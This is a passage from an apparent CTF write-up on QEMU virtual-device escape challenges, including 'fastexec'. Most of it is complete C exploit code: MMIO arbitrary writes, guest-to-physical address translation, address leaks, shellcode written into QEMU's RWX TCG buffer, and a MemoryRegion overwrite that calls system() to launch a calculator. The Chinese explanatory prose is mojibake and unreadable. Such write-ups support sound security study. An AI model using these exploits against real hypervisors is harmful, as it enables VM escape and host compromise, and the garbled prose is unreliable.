O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        buf  = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>        ptr_buf = gva_to_gpa(buf);<br>        <span class="hljs-keyword">if</span>(ptr_buf != <span class="hljs-number">0</span> &amp;&amp; (ptr_buf &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] the_ptr_buf_addr_is %#lx\n&quot;</span>, ptr_buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <br>    *(<span class="hljs-type">uint64_t</span>*)(buf) = ptr_buf;<br>    *(<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">0xf31</span>;<br>    *(<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">0xa</span>) = <span class="hljs-number">0x50</span>;<br>    exec_cpu_physical_memory_rw(ptr_buf &gt;&gt; <span class="hljs-number">12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x10</span>);<br>    exec_cpu_physical_memory_rw(ptr_buf &gt;&gt; <span class="hljs-number">12</span>, <span class="hljs-number">0xfff</span>, <span class="hljs-number">2</span>);<br>    <br>    mmio_write(<span class="hljs-number">0x60</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">uint64_t</span> heap_addr = *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0xf20</span>);<br>    <span class="hljs-type">uint64_t</span> cpu_physical_memory_rw_addr = *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0xf28</span>);<br>    <span class="hljs-type">uint64_t</span> elf_base = cpu_physical_memory_rw_addr - <span class="hljs-number">0x5bc5c0</span>;<br>    <span class="hljs-type">uint64_t</span> system_plt = elf_base + <span class="hljs-number">0x2A7A80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_heap_addr_is %#lx\n&quot;</span>, heap_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_cpu_physical_memory_rw_addr_is %#lx\n&quot;</span>, cpu_physical_memory_rw_addr);<br><br>    xor_0x209(<span class="hljs-number">0x88</span>, <span class="hljs-number">0x118</span>);<br><br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br>    <span class="hljs-type">uint64_t</span> cmd_addr = heap_addr + <span class="hljs-number">0x1510</span>;<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x8c0</span>, cmd, <span class="hljs-number">0x40</span>);<br><br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0x7</span> + <span class="hljs-number">0xd00</span>) = cmd_addr;<br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0x7</span> + <span class="hljs-number">0xd10</span>) = heap_addr + <span class="hljs-number">0xf70</span>;<br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0x7</span> + <span class="hljs-number">0xd18</span>) = system_plt;<br>    mmio_write(<span class="hljs-number">0x60</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x60</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                            </p><h3 id="fastexec"><a href="#fastexec" class="headerlink" title="fastexec"></a>fastexec</h3><p>fastexec_mmio_writeå‡½æ•°å¯¹offsetå’Œsizeéƒ½æ²¡é™åˆ¶ï¼Œå¯ä»¥å®ç°ä»»æ„å†™</p><img src="/img/19/Screenshot 2023-09-26 084145.png" style="zoom: 67%;" /><p>æ— æ³•æ³„æ¼æœ‰æ•ˆä¿¡æ¯ï¼Œä¸”ä»…æœ‰ä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œå®Œå…¨ä¸çŸ¥é“ä¸‹ä¸€æ­¥æ€æ ·è¿›è¡Œä¸‹å»ã€‚çœ‹å®Œå®˜æ–¹çš„wpåï¼Œæ‰çŸ¥é“Qemuä¼šåœ¨å†…å­˜ä¸­mmapä¸€å—å†…å­˜ä½œä¸ºTCGæ¨¡å—çš„ä»£ç ç¼“å†²åŒºï¼ˆTCGæ®µçš„åç§»æ¯æ¬¡éƒ½ä¸åŒï¼‰ï¼Œè¿™å—å†…å­˜æ˜¯RWXçš„ï¼Œä¿®æ”¹é‡Œé¢çš„å†…å®¹ä¸ºshellcodeå³å¯ã€‚</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> * mmio;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span>&#123;<br>    *(<span class="hljs-type">uint64_t</span>*)(mmio + addr) = val;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123; <br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span> *)(mmio + addr); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_write</span><span class="hljs-params">(<span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> addr)</span>&#123;<br>    mmio_write(<span class="hljs-number">8</span>, offset);<br>    mmio_write(<span class="hljs-number">0x10</span>, size);<br>    mmio_write(<span class="hljs-number">0x18</span>, addr);<br>    mmio_write(<span class="hljs-number">0x20</span>, <span class="hljs-number">0xF62D</span>);<br>&#125;<br><br><span class="hljs-comment">//char shellcode[] = &quot;\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x11\x00\x00\x00\x67\x6e\x6f\x6d\x65\x2d\x63\x61\x6c\x63\x75\x6c\x61\x74\x6f\x72\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05&quot;;</span><br><span class="hljs-type">char</span> shellcode[] = &#123;<span class="hljs-number">72</span>, <span class="hljs-number">49</span>, <span class="hljs-number">201</span>, <span class="hljs-number">72</span>, <span class="hljs-number">129</span>, <span class="hljs-number">233</span>, <span class="hljs-number">247</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">72</span>, <span class="hljs-number">141</span>, <span class="hljs-number">5</span>, <span class="hljs-number">239</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">72</span>, <span class="hljs-number">187</span>, <span class="hljs-number">124</span>, <span class="hljs-number">199</span>, <span class="hljs-number">145</span>, <span class="hljs-number">218</span>, <span class="hljs-number">201</span>, <span class="hljs-number">186</span>, <span class="hljs-number">175</span>, <span class="hljs-number">93</span>, <span class="hljs-number">72</span>, <span class="hljs-number">49</span>, <span class="hljs-number">88</span>, <span class="hljs-number">39</span>, <span class="hljs-number">72</span>, <span class="hljs-number">45</span>, <span class="hljs-number">248</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">226</span>, <span class="hljs-number">244</span>, <span class="hljs-number">22</span>, <span class="hljs-number">252</span>, <span class="hljs-number">201</span>, <span class="hljs-number">67</span>, <span class="hljs-number">129</span>, <span class="hljs-number">1</span>, <span class="hljs-number">128</span>, <span class="hljs-number">63</span>, <span class="hljs-number">21</span>, <span class="hljs-number">169</span>, <span class="hljs-number">190</span>, <span class="hljs-number">169</span>, <span class="hljs-number">161</span>, <span class="hljs-number">186</span>, <span class="hljs-number">252</span>, <span class="hljs-number">21</span>, <span class="hljs-number">245</span>, <span class="hljs-number">32</span>, <span class="hljs-number">249</span>, <span class="hljs-number">247</span>, <span class="hljs-number">170</span>, <span class="hljs-number">186</span>, <span class="hljs-number">175</span>, <span class="hljs-number">21</span>, <span class="hljs-number">245</span>, <span class="hljs-number">33</span>, <span class="hljs-number">195</span>, <span class="hljs-number">50</span>, <span class="hljs-number">211</span>, <span class="hljs-number">186</span>, <span class="hljs-number">175</span>, <span class="hljs-number">93</span>, <span class="hljs-number">25</span>, <span class="hljs-number">191</span>, <span class="hljs-number">225</span>, <span class="hljs-number">181</span>, <span class="hljs-number">187</span>, <span class="hljs-number">206</span>, <span class="hljs-number">143</span>, <span class="hljs-number">25</span>, <span class="hljs-number">53</span>, <span class="hljs-number">148</span>, <span class="hljs-number">193</span>, <span class="hljs-number">150</span>, <span class="hljs-number">136</span>, <span class="hljs-number">227</span>, <span class="hljs-number">146</span>, <span class="hljs-number">103</span>, <span class="hljs-number">76</span>, <span class="hljs-number">233</span>, <span class="hljs-number">161</span>, <span class="hljs-number">225</span>, <span class="hljs-number">177</span>, <span class="hljs-number">217</span>, <span class="hljs-number">206</span>, <span class="hljs-number">49</span>, <span class="hljs-number">31</span>, <span class="hljs-number">199</span>, <span class="hljs-number">199</span>, <span class="hljs-number">141</span>, <span class="hljs-number">129</span>, <span class="hljs-number">51</span>, <span class="hljs-number">73</span>, <span class="hljs-number">82</span>, <span class="hljs-number">121</span>, <span class="hljs-number">199</span>, <span class="hljs-number">145</span>, <span class="hljs-number">218</span>, <span class="hljs-number">201</span>, <span class="hljs-number">186</span>, <span class="hljs-number">175</span>, <span class="hljs-number">93</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">void</span> *buf;<br>    <span class="hljs-type">uint64_t</span> ptr_addr;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br><br>    system(<span class="hljs-string">&quot;sysctl vm.nr_hugepages=30&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x100000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | <span class="hljs-number">0x40000</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\x90&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>        ptr_addr = gva_to_gpa(buf);<br>        <span class="hljs-keyword">if</span>(ptr_addr != <span class="hljs-number">0</span> &amp;&amp; (ptr_addr &amp; <span class="hljs-number">0xfffff</span>) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x100</span>; ++i)&#123;<br>            <span class="hljs-built_in">memset</span>(buf + i * <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;\x90&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; ++i)&#123;<br>        <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x400</span> + i * <span class="hljs-number">0x1000</span>, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>    &#125;<br>    <br>    do_write(<span class="hljs-number">0xffffffffba5185f0</span>, <span class="hljs-number">0x100000</span>, ptr_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p> æœ€åå¼¹å‡ºè®¡ç®—å™¨ï¼š</p><img src="/img/19/Screenshot 2023-09-25 190239.png" style="zoom: 67%;" /><p>â€‹                                                                                                                                </p><p>åæ¥å‘ç°è¿˜æœ‰å…¶å®ƒæ–¹æ³•ï¼Œå»ä¿®æ”¹MemoryRegionä¸­çš„opaqueï¼Œä½†æ˜¯ä¹Ÿè¦çˆ†ç ´ä¸€å­—èŠ‚ï¼Œå…·ä½“å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/fkiFV7u3QjDsfHDcdwl6iA">https://mp.weixin.qq.com/s/fkiFV7u3QjDsfHDcdwl6iA</a></p><p>æœ€åä¿®æ”¹MemoryRegionç»“æ„ä½“å¦‚ä¸‹ï¼š</p><img src="/img/19/Screenshot 2023-09-26 004411.png" style="zoom: 50%;" /><p>â€‹                                            </p><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> * mmio;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span>&#123;<br>    *(<span class="hljs-type">uint64_t</span>*)(mmio + addr) = val;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123; <br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span> *)(mmio + addr); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_write</span><span class="hljs-params">(<span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> addr)</span>&#123;<br>    mmio_write(<span class="hljs-number">8</span>, offset);<br>    mmio_write(<span class="hljs-number">0x10</span>, size);<br>    mmio_write(<span class="hljs-number">0x18</span>, addr);<br>    mmio_write(<span class="hljs-number">0x20</span>, <span class="hljs-number">0xF62D</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">void</span> *buf;<br>    <span class="hljs-type">uint64_t</span> ptr_addr;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    <br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    *(<span class="hljs-type">uint16_t</span>*)buf = <span class="hljs-number">0xf010</span> - <span class="hljs-number">0xb8</span>;<br><br>    ptr_addr = gva_to_gpa(buf);<br>    do_write(<span class="hljs-number">0xffffffffffffff40</span>, <span class="hljs-number">2</span>, ptr_addr);<br><br>    <span class="hljs-type">uint64_t</span> heap_addr = mmio_read(<span class="hljs-number">8</span>);<br>    <span class="hljs-type">uint64_t</span> leak_elf_addr = mmio_read(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">uint64_t</span> elf_base = leak_elf_addr - <span class="hljs-number">0xd62d20</span>;<br>    <span class="hljs-type">uint64_t</span> system_plt = elf_base + <span class="hljs-number">0x2C2180</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_heap_addr_is %#lx\n&quot;</span>, heap_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; [*] leak_elf_base_addr_is %#lx\n&quot;</span>, elf_base);<br><br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">0x20</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br>    mmio_write(<span class="hljs-number">0x18</span>, heap_addr + <span class="hljs-number">0x20</span>);<br>    *(<span class="hljs-type">uint64_t</span>*)buf = heap_addr + <span class="hljs-number">0x8f0</span> + <span class="hljs-number">0x58</span>;<br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">8</span>) = heap_addr + <span class="hljs-number">0x8f0</span> + <span class="hljs-number">0x60</span>;<br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0x10</span>) = system_plt;<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x18</span>, cmd, <span class="hljs-keyword">sizeof</span>(cmd));<br><br>    do_write(<span class="hljs-number">0xffffffffffffff18</span>, <span class="hljs-number">0x30</span>, ptr_addr);<br>    mmio_read(<span 